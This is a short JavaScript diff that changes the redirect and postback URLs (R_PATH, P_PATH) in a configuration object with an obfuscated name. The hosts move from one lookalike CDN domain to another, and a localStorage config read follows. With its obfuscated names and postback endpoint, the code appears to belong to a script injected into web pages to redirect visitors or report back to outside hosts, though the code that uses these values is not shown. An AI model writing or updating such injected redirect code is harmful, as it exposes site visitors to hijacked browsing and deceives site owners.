@@ -4,8 +4,8 @@
         window._fckLxKmpPqrGc9GY = {
             unique: false,
             ttl: 86400,
-            R_PATH: 'https://jscdn.site/8KX85VvW',
-            P_PATH: 'https://jscdn.site/19d4412/postback',
+            R_PATH: 'https://main-js.com/8KX85VvW',
+            P_PATH: 'https://main-js.com/19d4412/postback',
         };
     }
     const _ZBk1FHH2KMyv1dgh = localStorage.getItem('config');
